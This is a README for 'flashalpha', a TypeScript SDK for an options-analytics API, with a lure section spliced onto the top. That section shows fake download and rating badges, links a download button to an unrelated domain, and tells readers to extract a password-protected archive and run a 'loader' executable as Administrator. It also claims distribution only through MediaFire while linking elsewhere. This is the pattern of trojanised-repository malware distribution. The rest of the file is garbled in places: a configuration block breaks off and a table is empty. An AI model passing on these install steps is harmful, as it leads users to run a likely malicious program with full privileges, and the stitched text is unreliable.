<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Installation

```bash
npm install flashalpha
```

## Quick Start

```typescript
import { FlashAlpha } from 'flashalpha';

const fa = new FlashAlpha('your-api-key');

// Gamma exposure for SPY
const gex = await fa.gex('SPY');
console.log(gex);

// Filter by expiration and minimum open interest
const gexFiltered = await fa.gex('SPY', { expiration: '2024-12-20', minOi: 100 });

// BSM greeks
const greeks = await fa.greeks({ spot: 500, strike: 500, dte: 30, sigma: 0.20 });
console.log(greeks);

// Implied volatility from a market price
const iv = await fa.iv({ spot: 500, strike: 500, dte: 30, price: 10.5 });
console.log(iv);

// Live stock quote
const quote = await fa.stockQuote('SPY');
console.log(quote);

// Live options screener — harvestable VRP setups
const result = await fa.screener({
  filters: {
    op: 'and',
    conditions: [
      { field: 'regime', operator: 'eq', value: 'positive_gamma' },
      { field: 'vrp_regime', operator: 'eq', value: 'harvestable' },
      { field: 'harvest_score', operator: 'gte', value: 65 },
    ],
  },
  sort: [{ field: 'harvest_score', direction: 'desc' }],
  select: ['symbol', 'price', 'harvest_score', 'dealer_flow_risk'],
});
```

## sell-window: should you sell options today?

Option sellers get wiped out on a few bad days. sell-window tells you which days to stay out, and on the days it says sell, it hands you the trades: which expiry, which strikes and how to exit. Every session, for SPY, QQQ and IWM. More than 5 million backtests led to this one endpoint.

```typescript
import { FlashAlpha } from 'flashalpha';

const fa = new FlashAlpha('YOUR_API_KEY');
const answer = await fa.sellWindow('SPY');

for (const window of answer.windows ?? []) {
  console.log(window.expiry, window.action); // sell, skip or unavailable
  for (const trade of window.candidates ?? []) {
    console.log(' ', trade.structure, trade.mid_credit, trade.exit);
  }
}
```

Each of the four windows (the same-day expiry, then the expiries closest to one week, two weeks and one month out) says `sell`, `skip` or `unavailable`. On a sell it lists the trades, with strikes, quotes and the exit rule. On a skip there is nothing to do.

| Backtest, 2018 to 2026 | Following sell-window | Selling the same trades every day |
|---|---|---|
| Max drawdown at the same trade size | $255k | $959k |
| Worst month at the same trade size | -$171k | -$307k |
| Sharpe ratio | 0.76 | 0.61 |
| Total P&L at the same max drawdown | $3.55M | $2.32M |
| Worst day at the same max drawdown | -$258k | -$385k |

Cut the risk or earn more. Keep your trade size and the deepest drawdown falls 73%. Or size up about 3.8 times, until the deepest drawdown matches, and you earn 53% more. These are two separate choices, not one result.

## Data provenance: `data_as_of`

Every successful JSON-object response carries `data_as_of`, reporting when each upstream
feed last delivered to the node that answered, plus `endpoint_version` identifying the
deployment that produced it. That is every method on this client except the handful that
return a bare JSON array - see the note at the end of this section.

```ts
const gex = await fa.gex('SPY');

gex.data_as_of.equity_options_feed; // '2026-08-25T18:48:58.204Z'
gex.data_as_of.oi_feed;             // '2026-08-24T20:00:00.000Z'  prior session's close
gex.data_as_of.node;                // 'fa2'
gex.endpoint_version;               // '2026.08.25'
```

`DataAsOf` is exported from the package root, so the object is typed rather than an
untyped passthrough:

```ts
import type { DataAsOf } from 'flashalpha';
```

| Field | Feed | Expected cadence |
|---|---|---|
| `node` | Which node answered | Nodes hydrate independently |
| `equity_feed` | Equity and ETF spot quotes | seconds, during market hours |
| `equity_options_feed` | Equity and ETF option quotes | seconds, during market hours |
| `index_feed` | Index spot (SPX, RUT, VIX and the other index roots) | seconds, during market hours |
| `index_options_feed` | Index option quotes | seconds, during market hours |
| `futures_feed` | Futures prices | seconds, during the futures session |
| `futures_options_feed` | Futures option quotes | seconds, during the futures session |
| `flow_feed` | Classified options and stock trade tape | seconds, during market hours |
| `oi_feed` | Settled open interest | daily, dated to the prior 16:00 ET close |
| `macro_feed` | VIX, VVIX, SKEW, MOVE, SPX, Fear & Greed | minutes; reports its OLDEST component |

### How to read it

- **Check the feeds your call depends on.** A GEX call on an equity is answered from
  `equity_feed`, `equity_options_feed` and `oi_feed`. `futures_feed` being `null` in that
  response says nothing about the answer.
- **Compare against the cadence, not the clock.** `oi_feed` at the previous session's
  close is correct: settled open interest is published once per session, so on a Monday
  the newest figure that exists is Friday's. An options feed an hour behind during the
  regular session is not correct.
- **`null` means "not seen on this node", not "broken".** A node that has never been
  asked for a futures symbol has never opened that feed.
- **Spot and options are separate on purpose.** They arrive over different pipes and can
  fail independently.
- **It evidences feed activity, not per-contract freshness.** An illiquid strike may not
  have quoted for hours while its feed is healthy.
- **`data_as_of` is not `as_of`.** `as_of` is response-generation time or the newest
  contract in the payload, depending on the endpoint. `data_as_of` describes the feeds
  behind it.

### Bare-array endpoints

A few endpoints return a bare JSON array, which has nowhere to put an envelope in the
body. The API sends the same information in the `X-Data-As-Of` and `X-Endpoint-Version`
response headers instead - but this client returns the parsed body only and does not
surface response headers, so the envelope is **not reachable through those methods**.
Call the HTTP endpoint directly if you need provenance for one of them.

## All Methods

### Market Data

| Method | Description |
|--------|-------------|
| `stockQuote(ticker)` | Live stock quote (bid/ask/mid/last) |
| `optionQuote(ticker, opts?)` | Option quotes with greeks. Requires Growth+ |
| `surface(symbol)` | Volatility surface grid (public) |
| `surfaceSvi(symbol)` | Live SVI-fitted volatility surface parameters per expiry. Requires Alpha+ |
| `expectedMove(symbol, opts?)` | Straddle-implied expected move per expiry. Requires Basic+ |
| `stockSummary(symbol)` | Comprehensive stock summary (price, vol, exposure, macro) |

### Historical Data

| Method | Description |
|--------|-------------|
| `historicalStockQuote(ticker, { date, time? })` | Historical stock quotes (minute-by-minute) |
| `historicalOptionQuote(ticker, { date, time?, expiry?, strike?, type? })` | Historical option quotes |

### Exposure Analytics

| Method | Description |
|--------|-------------|
| `gex(symbol, opts?)` | Gamma exposure by strike |
| `dex(symbol, opts?)` | Delta exposure by strike |
| `vex(symbol, opts?)` | Vanna exposure by strike |
| `chex(symbol, opts?)` | Charm exposure by strike |
| `exposureSummary(symbol)` | Full exposure summary (GEX/DEX/VEX/CHEX + hedging). Requires Growth+ |
| `exposureLevels(symbol)` | Key support/resistance levels from options exposure |
| `exposureSheet(symbol, opts?)` | Unified per-strike exposure sheet (GEX/DEX/VEX/CHEX + DAG + OI). Requires Growth+ |
| `exposureTermStructure(symbol)` | Per-greek exposure by DTE bucket and expiry. Requires Growth+ |
| `exposureBasket({ symbols, weights? })` | Weighted cross-symbol exposure aggregate (basket GEX/DEX/VEX/CHEX). Requires Growth+ |
| `exposureOiDiff(symbol, opts?)` | Day-over-day open-interest deltas (top-N changed strikes). Requires Growth+ |
| `narrative(symbol)` | Verbal narrative analysis of exposure. Requires Growth+ |
| `zeroDte(symbol, opts?)` | Real-time 0DTE analytics (`{ strikeRange?, expiry? }`). Requires Growth+ |

### Flow (live, simulation-aware) — Growth+ (raw tape, unusual-flow signals, OI simulator state & the full live bundle are Alpha)

| Method | Description |
|--------|-------------|
| `flowLevels(symbol, opts?)` | Live gamma flip / call & put walls / max pain |
| `flowPinRisk(symbol, opts?)` | 0DTE pin-risk score + component breakdown |
| `flowSummary(symbol, opts?)` | At-a-glance flow direction + headline GEX shift |
| `flowOi(symbol, opts?)` | Open-interest simulator state (official vs intraday) |
| `flowGex(symbol, opts?)` | Live (flow-adjusted) GEX + per-strike profile |
| `flowDex(symbol, opts?)` | Live (flow-adjusted) DEX + per-strike profile |
| `flowDealerRisk(symbol, opts?)` | Settled-vs-live dealer GEX/DEX + flow adjustment |
| `flowLive(symbol, opts?)` | Everything-at-once live flow bundle |
| `flowSignals(symbol, opts?)` | Scored, classified unusual-flow feed (block/sweep, intent, 0-100 score) |
| `flowSignalsSummary(symbol, opts?)` | Net bullish/bearish + opening/closing premium roll-up + top 10 signals |
| `flowOptionRecent(symbol, opts?)` | Recent option trades, newest-first |
| `flowOptionSummary(symbol, opts?)` | Per-underlying option-flow aggregates |
| `flowOptionBlocks(symbol, opts?)` | Large option prints (`size >= minSize`) |
| `flowOptionHistory(symbol, opts?)` | Per-minute option-flow buckets |
| `flowOptionCumulative(symbol, opts?)` | Cumulative option net-flow series |
| `flowStockRecent(symbol, opts?)` | Recent stock trades, newest-first |
| `flowStockSummary(symbol)` | Per-symbol stock-flow aggregates |
| `flowStockBlocks(symbol, opts?)` | Large stock prints (`size >= minSize`) |
| `flowStockHistory(symbol, opts?)` | Per-minute stock-flow buckets w/ OHLC |
| `flowStockCumulative(symbol, opts?)` | Cumulative stock net-flow series |
| `flowOptionsLeaderboard(opts?)` | Cross-symbol option-flow leaderboard |
| `flowOptionsOutliers(opts?)` | Cross-symbol option-flow outliers |
| `flowStocksLeaderboard(opts?)` | Cross-symbol stock-flow leaderboard |
| `flowStocksOutliers(opts?)` | Cross-symbol stock-flow outliers |
| `flowDealerPremium(symbol, opts?)` | Full-tape Net Dealer Premium (dealer buy vs write) |
| `flowStockBars(symbol, { resolution, minutes? })` | Multi-resolution OHLCV+flow bars (1s/1m/5m/15m/30m/1h/4h) |

### Zero-DTE Flow

| Method | Description |
|--------|-------------|
| `flowZeroDteSnapshot(symbol, opts?)` | Live 0DTE snapshot (flow-adjusted) + flow-direction read (`opts.expiry`). Requires Growth+ |
| `flowZeroDteSeries(symbol, opts?)` | Intraday 0DTE flow series (levels, regime, hedge flow over time). Requires Growth+ |
| `flowZeroDteHedgeFlow(symbol, opts?)` | Dealer hedge-flow series for the 0DTE expiry. Requires Growth+ |
| `flowZeroDteHeatmap(symbol, opts?)` | Strike × time 0DTE heatmap (gex/dex/vex/chex/oi/signed_flow). Requires Alpha+ |
| `flowZeroDteStrikeFlow(symbol, opts?)` | Per-strike signed 0DTE flow (delta/gamma dollars, contracts). Requires Alpha+ |
| `flowZeroDteLeaderboard(opts?)` | Cross-symbol 0DTE leaderboard ranked by metric (heat/pin_risk/abs_flow/charm_intensity). Requires Alpha+ |

### Strategy Signals

Each GETs `/v1/strategies/{kind}/{symbol}` and returns a shared
`StrategyDecisionResponse` (action, conviction, best matching multi-leg
structure with legs, risk flags, data quality).

| Method | Description |
|--------|-------------|
| `strategyFlowAnomaly(symbol, opts?)` | Directional options-flow imbalance + matching short vertical. Requires Growth+ |
| `strategyExpiryPositioning(symbol, opts?)` | OPEX pin-risk / expiry-positioning (iron fly when pin likely). Requires Basic+ |
| `strategyZeroDte(symbol, opts?)` | Same-day 0DTE range-compression signal. Requires Growth+ |
| `strategyDealerRegime(symbol, opts?)` | Dealer gamma-regime (long/short gamma positioning). Requires Growth+ |
| `strategyVolCarry(symbol, opts?)` | Vol-carry / VRP-harvest (short vol structures). Requires Alpha+ |
| `strategyYieldEnhancement(symbol, opts?)` | Covered call / cash-secured put yield enhancement. Requires Growth+ |
| `strategySurfaceAnomaly(symbol, opts?)` | Vol-surface anomaly (mispriced wings / kinks). Requires Alpha+ |
| `strategySkew(symbol, opts?)` | Skew read (25d / 10d). Requires Growth+ |
| `strategyTermStructure(symbol)` | Term-structure (contango / backwardation) read. Requires Growth+ |
| `strategyTailPricing(symbol, opts?)` | Tail-pricing (wing richness / convexity). Requires Growth+ |
| `sellWindow(symbol)` | sell-window: should you sell options today? Sell or skip per expiry, with the trades to place (SPY, QQQ, IWM). Requires Basic+ through Nov 2026, then Growth+ |

### Earnings

| Method | Description |
|--------|-------------|
| `earningsCalendar(opts?)` | Upcoming earnings calendar with implied moves. Requires Growth+ |
| `earningsExpectedMove(symbol)` | Earnings-implied expected-move decomposition. Requires Growth+ |
| `earningsHistory(symbol, opts?)` | Past earnings events (implied vs actual move, IV crush). Requires Growth+ |
| `earningsIvCrush(symbol)` | Expected + historical IV crush around earnings. Requires Growth+ |
| `earningsVrp(symbol)` | Earnings variance-risk-premium (implied vs realized move). Requires Alpha+ |
| `earningsDealerPositioning(symbol)` | Dealer positioning into earnings (levels, GEX by bucket). Requires Alpha+ |
| `earningsStrategies(symbol)` | Strategy-suitability scores (straddle/strangle/condor). Requires Alpha+ |
| `earningsScreener(opts?)` | Cross-sectional earnings screener (rank by VRP, crush, move). Requires Alpha+ |

### Structures (POST, pure-math)

| Method | Description |
|--------|-------------|
| `structurePnl({ legs, ... })` | At-expiry P&L curve, breakevens, max profit/loss for a multi-leg structure. Requires Basic+ |
| `structureGreeks({ legs, spot, ... })` | Aggregate position Greeks for a multi-leg structure (BSM). Requires Basic+ |

### Pricing and Sizing

| Method | Description |
|--------|-------------|
| `greeks(opts)` | Full BSM greeks (delta, gamma, theta, vega, vanna, charm, ...) |
| `iv(opts)` | Implied volatility from a market price |
| `kelly(opts)` | Kelly criterion optimal position sizing. Requires Growth+ |

### Volatility Analytics

| Method | Description |
|--------|-------------|
| `volatility(symbol)` | Comprehensive volatility analysis. Requires Growth+ |
| `advVolatility(symbol)` | Advanced analytics: SVI, variance surface, arbitrage detection. Requires Alpha+ |
| `liquidity(symbol)` | Per-expiry execution/liquidity scores. Requires Growth+ |
| `skewTerm(symbol)` | Skew term structure with vol-desk conventions (risk reversal, butterfly). Requires Growth+ |
| `spotVolCorrelation(symbol)` | Rolling spot/vol correlation (20d & 60d). Requires Growth+ |
| `dispersion({ index, symbols, ... })` | Implied vs realized correlation / dispersion for an index basket. Requires Alpha+ |
| `realizedVolatility(symbol)` | Range-based realized vol estimators (close-to-close, Parkinson, Garman-Klass, Rogers-Satchell, Yang-Zhang) over 10/20/30-day windows. Requires Alpha+ |
| `volatilityForecast(symbol, opts?)` | Conditional vol forecasts (EWMA, HAR-RV, GARCH(1,1) MLE). Requires Alpha+ |

### VRP (Variance Risk Premium)

| Method | Description |
|--------|-------------|
| `vrp(symbol, opts?)` | VRP dashboard — IV-vs-RV spread, directional skew, term structure, GEX-conditioning, harvest score. Pass `{ date }` for a historical snapshot. Requires Alpha+ |
| `vrpHistory(symbol, opts?)` | Daily VRP time series (ATM IV vs realized, straddle, expected move). Requires Alpha+ |

### Macro / Universe

| Method | Description |
|--------|-------------|
| `vixState()` | VIX overvixing / undervixing regime (VIX vs SPX realized vol). Requires Growth+ |
| `universe(opts?)` | Curated symbol directory (the queryable universe). Public |

### Reference Data

| Method | Description |
|--------|-------------|
| `tickers()` | All available stock tickers |
| `options(ticker)` | Option chain metadata (expirations and strikes) |
| `symbols()` | Currently queried symbols with live data |

### Max Pain

| Method | Description |
|--------|-------------|
| `maxPain(symbol, options?)` | Max pain analysis with dealer alignment, pain curve, OI breakdown, pin probability, multi-expiry calendar (Basic+) |

### Screener

| Method | Description |
|--------|-------------|
| `screener(options)` | **Live options screener** — filter/rank by GEX, VRP, IV, greeks, harvest scores, custom formulas (Growth+) |

### Account and System

| Method | Description |
|--------|-------------|
| `screenerFields()` | List the queryable screener fields and their types (any authenticated tier) |
| `account()` | Account info and quota |
| `health()` | Health check (public) |

## Futures (CME)

FlashAlpha serves the full options-analytics stack for **CME futures** across six complexes - equity index (`ES=F`, `NQ=F`, `RTY=F`, `YM=F`, `MES=F`, `MNQ=F`), metals (`GC=F` gold, `SI=F` silver), energy (`CL=F` crude oil, `NG=F` natural gas), the Treasury curve (`ZT=F`, `ZF=F`, `ZN=F`, `TN=F`, `ZB=F`, `UB=F`), grains (`ZC=F` corn, `ZS=F` soybeans, `ZW=F` wheat) and crypto (`BTC=F` bitcoin). Options-on-futures are priced with **Black-76** (forward-priced) and each root carries its own CME contract multiplier, so notionals and dollar gamma are in real dollars. Note the quote conventions: Treasuries are quoted in points of par and grains in cents, so their multipliers are the contract size divided by 100. Everything that works for an equity works for futures: gamma exposure (GEX), DEX, VEX, CHEX, key levels, max pain, the IV surface, exposure summary, narrative, and live flow.

```typescript
// Gamma exposure for the E-mini S&P 500 future
const gex = await fa.gex('ES=F');
console.log(gex);
```

Use the `=F` suffix - bare `ES`/`NQ` are equities, not futures. In raw REST paths URL-encode the `=` as `%3D` (e.g. `GET /v1/exposure/gex/GC%3DF`); SDK methods take the plain string `"GC=F"`. Futures symbols require the Growth plan or higher. Historical replay for futures is coming; live analytics are available now.

## Method Options

### gex / dex / vex / chex

```typescript
await fa.gex('SPY', {
  expiration: '2024-12-20', // filter by expiration date (YYYY-MM-DD)
  minOi: 100,               // minimum open interest filter (gex only)
});
```

### zeroDte

```typescript
await fa.zeroDte('SPY', {
  strikeRange: 10, // number of strikes around ATM to include
});
```

### greeks

```typescript
await fa.greeks({
  spot: 500,       // underlying price
  strike: 500,     // option strike price
  dte: 30,         // days to expiration
  sigma: 0.20,     // implied volatility (annualized, e.g. 0.20 = 20%)
  type: 'call',    // 'call' or 'put' (default: 'call')
  r: 0.05,         // risk-free rate (optional)
  q: 0.01,         // dividend yield (optional)
});
```

### iv

```typescript
await fa.iv({
  spot: 500,
  strike: 500,
  dte: 30,
  price: 10.5,   // market price of the option
  type: 'call',
  r: 0.05,       // optional
  q: 0.01,       // optional
});
```

### kelly

```typescript
await fa.kelly({
  spot: 500,
  strike: 500,
  dte: 30,
  sigma: 0.20,
  premium: 5.0,  // option premium paid
  mu: 0.10,      // expected drift of the underlying (annualized)
  type: 'call',
  r: 0.05,
  q: 0.01,
});
```

## Error Handling

All SDK methods throw typed errors. Catch them individually or catch the base `FlashAlphaError`.

```typescript
import {
  FlashAlpha,
  AuthenticationError,
  TierRestrictedError,
  NotFoundError,
  RateLimitError,
  ServerError,
  FlashAlphaError,
} from 'flashalpha';

const fa = new FlashAlpha('your-api-key');

try {
  const data = await fa.gex('SPY');
} catch (err) {
  if (err instanceof AuthenticationError) {
    console.error('Invalid API key — check your credentials.');
  } else if (err instanceof TierRestrictedError) {
    console.error(`Upgrade required. Current: ${err.currentPlan}, Need: ${err.requiredPlan}`);
  } else if (err instanceof NotFoundError) {
    console.error('Symbol not found or no data available.');
  } else if (err instanceof RateLimitError) {
    const wait = err.retryAfter ?? 60;
    console.error(`Rate limited. Retry after ${wait}s.`);
  } else if (err instanceof ServerError) {
    console.error(`Server error (${err.statusCode}): ${err.message}`);
  } else if (err instanceof FlashAlphaError) {
    console.error(`API error (${err.statusCode}): ${err.message}`);
  } else {
    throw err; // unexpected — rethrow
  }
}
```

## Configuration

```typescript
const fa = new FlashAlpha('your-api-key', {
## TypeScript

The SDK is written in TypeScript and ships with full type declarations.

```typescript
import type {
  GexOptions,
  GreeksOptions,
  IvOptions,
  KellyOptions,
  ZeroDteOptions,
  VrpOptions,
  StrategyDecisionResponse,
  EarningsCalendarResponse,
  StructurePnlRequest,
  DispersionOptions,
} from 'flashalpha';
```

## Other SDKs

| Language | Package | Repository |
|----------|---------|------------|
## What the paid tiers unlock

The free tier covers single-expiry GEX on equities, key levels, the BSM Greeks/IV
calculator and stock quotes. Paid tiers add:

- **DEX, VEX (vanna) and CHEX (charm) exposure, plus max pain** — from the **Basic tier**
  ($79/mo), with ETF and index symbols.
- **Full-chain GEX, 0DTE and flow analytics** — from the **Growth tier** ($299/mo).
- **Point-in-time replay since 2017, SVI vol surfaces, VRP analytics, higher-order Greeks**,
  uncached and unlimited — the **Alpha tier** ($1,499/mo). FlashAlpha is one of the only
  public APIs publishing aggregate vanna and charm exposure across the full universe, with
  no look-ahead and no training-serving skew.

Built for quants, prop desks, and vol funds. See the full picture and get a key:


---

MIT License

Copyright (c) 2024 FlashAlpha

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
